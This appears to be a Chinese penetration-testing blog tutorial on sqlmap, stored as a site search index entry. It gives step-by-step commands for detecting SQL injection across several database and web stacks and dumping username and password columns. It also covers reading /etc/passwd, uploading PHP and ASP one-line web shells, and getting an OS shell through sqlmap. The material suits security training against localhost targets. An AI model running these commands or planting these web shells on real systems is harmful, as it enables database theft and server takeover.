<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Sqlmap使用</title>
      <link href="/undefined/d85c58bf.html"/>
      <url>/undefined/d85c58bf.html</url>
      
        <content type="html"><![CDATA[<h1 id="Access-asp网站"><a href="#Access-asp网站" class="headerlink" title="Access+asp网站"></a>Access+asp网站</h1><h2 id="检测是否存在注入"><a href="#检测是否存在注入" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> -v 3</span><br></pre></td></tr></table></figure><blockquote><p>-v：详细登记（0-6，默认1）</p><p>0：只显示python错误以及重要信息<br>1：显示信息以及警告<br>2：显示debug消息<br>3：显示注入payload<br>4：显示http请求<br>5：显示http响应头<br>6：显示http响应内容</p></blockquote><p>输出back-end DBMS:Microsoft Access再出输入上面的命令，则会有注入语句提示</p><p><img src="/images/Sqlmap%E4%BD%BF%E7%94%A8/image1.png"></p><h2 id="获取表名"><a href="#获取表名" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables</span><br></pre></td></tr></table></figure><p><img src="/images/Sqlmap%E4%BD%BF%E7%94%A8/image2.png"></p><h2 id="获取列名"><a href="#获取列名" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T admin</span><br><span class="line"><span class="comment"># -T admin    指定表名</span></span><br></pre></td></tr></table></figure><p><img src="/images/Sqlmap%E4%BD%BF%E7%94%A8/image3.png"></p><h2 id="获取数据"><a href="#获取数据" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T admin</span><br></pre></td></tr></table></figure><h1 id="Mysql-php网站"><a href="#Mysql-php网站" class="headerlink" title="Mysql+php网站"></a>Mysql+php网站</h1><h2 id="检测是否存在注入-1"><a href="#检测是否存在注入-1" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -v 1</span><br><span class="line"><span class="comment"># -p    指定测试参数</span></span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名"><a href="#获取当前用户和数据库名" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-1"><a href="#获取表名-1" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --tables -D <span class="string">&quot;admin&quot;</span></span><br><span class="line"><span class="comment"># -D &quot;admin&quot;    指定admin的数据库</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-1"><a href="#获取列名-1" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid -T <span class="string">&quot;mmanage&quot;</span> --columns -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-1"><a href="#获取数据-1" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?r=content&amp;cid=3&quot;</span> -p cid --dump -C <span class="string">&quot;user,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Mysql-asp-net网站"><a href="#Mysql-asp-net网站" class="headerlink" title="Mysql+asp.net网站"></a>Mysql+asp.net网站</h1><h2 id="检测是否存在注入-2"><a href="#检测是否存在注入-2" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> -v 3</span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-1"><a href="#获取当前用户和数据库名-1" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-2"><a href="#获取表名-2" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --tables -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-2"><a href="#获取列名-2" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --columns -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-2"><a href="#获取数据-2" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1?id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Orcale-jsp网站"><a href="#Orcale-jsp网站" class="headerlink" title="Orcale+jsp网站"></a>Orcale+jsp网站</h1><h2 id="检测是否存在注入-3"><a href="#检测是否存在注入-3" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale -v 3</span><br><span class="line"><span class="comment"># --dbms orcale    指定数据库类型</span></span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-2"><a href="#获取当前用户和数据库名-2" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --current-user --current-db</span><br></pre></td></tr></table></figure><h2 id="获取表名-3"><a href="#获取表名-3" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --tables -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取列名-3"><a href="#获取列名-3" class="headerlink" title="获取列名"></a>获取列名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --columns -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-3"><a href="#获取数据-3" class="headerlink" title="获取数据"></a>获取数据</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp?id=1&quot;</span> --dbms orcale --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span></span><br></pre></td></tr></table></figure><h1 id="Post注入网站"><a href="#Post注入网站" class="headerlink" title="Post注入网站"></a>Post注入网站</h1><h2 id="检测是否存在注入-4"><a href="#检测是否存在注入-4" class="headerlink" title="检测是否存在注入"></a>检测是否存在注入</h2><p>post信息</p><p>name&#x3D;admin&amp;sub&#x3D;%E6%90%9C</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> -p name -v 3</span><br></pre></td></tr></table></figure><h2 id="获取当前用户和数据库名-3"><a href="#获取当前用户和数据库名-3" class="headerlink" title="获取当前用户和数据库名"></a>获取当前用户和数据库名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --current-user --current-db -p name -v 3</span><br></pre></td></tr></table></figure><p>如果是root用户，可以直接列出所有的数据库</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --dbs -v 3</span><br></pre></td></tr></table></figure><h2 id="获取表名-4"><a href="#获取表名-4" class="headerlink" title="获取表名"></a>获取表名</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php&quot;</span> --data <span class="string">&quot;name=admin&amp;sub=%E6%90%9C&quot;</span> --tables -D <span class="string">&quot;admin&quot;</span> -p name -v 3</span><br></pre></td></tr></table></figure><h1 id="Cookie注入网站"><a href="#Cookie注入网站" class="headerlink" title="Cookie注入网站"></a>Cookie注入网站</h1><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --level 2</span><br><span class="line"><span class="comment"># 指定测试等级，level&gt;=2时才会检测cookie</span></span><br></pre></td></tr></table></figure><h2 id="获取数据-4"><a href="#获取数据-4" class="headerlink" title="获取数据"></a>获取数据</h2><p>其他步骤和上面的一样</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.jsp&quot;</span> --cookie <span class="string">&quot;id=1&quot;</span> --dump -C <span class="string">&quot;username,password&quot;</span> -T <span class="string">&quot;mmanage&quot;</span> -D <span class="string">&quot;admin&quot;</span> --level 2</span><br></pre></td></tr></table></figure><h1 id="Mysql注入对网站读写操作"><a href="#Mysql注入对网站读写操作" class="headerlink" title="Mysql注入对网站读写操作"></a>Mysql注入对网站读写操作</h1><h2 id="读"><a href="#读" class="headerlink" title="读"></a>读</h2><p>只有root用户才有权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --file-read <span class="string">&quot;/etc/passwd&quot;</span> -v 1</span><br><span class="line"><span class="comment"># 读取/etc/passwd文件内容</span></span><br></pre></td></tr></table></figure><p>读取到的文件内容会保存在output文件夹里面</p><h2 id="写"><a href="#写" class="headerlink" title="写"></a>写</h2><p>前提：要知道写入文件的路径，可以通过phpinfo，找到DOCUMENT_ROOT</p><p>先创建一个一句话木马的文件muma.php</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    system(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --file-write c:/muma.php --file-dest /www/web/default/simple/muma.php -v 1</span><br></pre></td></tr></table></figure><h1 id="Mysql交互式写shell和执行命令"><a href="#Mysql交互式写shell和执行命令" class="headerlink" title="Mysql交互式写shell和执行命令"></a>Mysql交互式写shell和执行命令</h1><p>前提：magic_autoes_gpc必须是关闭的才可以，phpinfo可以查看</p><p>需要root权限</p><p>有写的权限</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --os-cmd=<span class="built_in">whoami</span></span><br></pre></td></tr></table></figure><p>上面的这条命令效果不是很好，建议使用下面这条，但是会产生两个文件</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sqlmap -u <span class="string">&quot;http://127.0.0.1/index.php?id=1&quot;</span> --os-shell</span><br></pre></td></tr></table></figure><p>在 <code>os-shell</code>中将一句话木马写入</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">echo</span> ^&lt;%<span class="built_in">eval</span> request(<span class="string">&quot;#&quot;</span>)%^&gt;&gt;d:\wwwroot\muma.asp</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> 渗透测试 </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
